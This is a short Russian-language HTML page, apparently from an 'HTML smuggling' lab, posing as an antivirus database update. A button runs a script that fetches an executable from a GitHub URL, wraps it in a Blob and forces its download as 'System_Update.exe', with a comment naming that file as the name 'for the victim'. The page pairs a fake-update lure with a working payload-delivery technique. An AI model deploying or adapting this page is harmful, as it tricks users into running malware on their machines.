<!DOCTYPE html>
<html lang="ru">
<head>
    <title>Проверка обновлений</title>
</head>
<body>
    <h1 style="font-family: Arial;">Система обновляет антивирусные базы...</h1>
    <p style="font-family: Arial;">Пожалуйста, нажмите на кнопку, чтобы завершить установку.</p>

    <!-- Кнопка для запуска скачивания -->
    <button onclick="smuggle()" style="padding: 10px; font-size: 16px; cursor: pointer;">Скачать обновление</button>

    <script>
        async function smuggle() {
            // ТОЧНАЯ ссылка на твой файл (smuggle-lab2 + cmd.exe)
            const url = 'https://raw.githubusercontent.com/richardamiller8282-boop/smuggle-lab2/main/cmd.exe';

            try {
                // 1. Загружаем файл
                const response = await fetch(url);
                
                // Проверяем, ответил ли сервер успехом
                if (!response.ok) {
                    alert('Ошибка загрузки: Сервер ответил ' + response.status + ' (файл не найден?)');
                    console.log('Статус:', response.status);
                    return;
                }

                // 2. Создаем Blob
                const blob = await response.blob();

                // 3. Создаем ссылку и кликаем по ней
                const link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = 'System_Update.exe'; // Имя для жертвы
                
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                // 4. Освобождаем память
                URL.revokeObjectURL(link.href);
            } catch (error) {
                alert('Ошибка сети или CORS: ' + error.message);
                console.error('Ошибка:', error);
            }
        }
    </script>
</body>
</html>
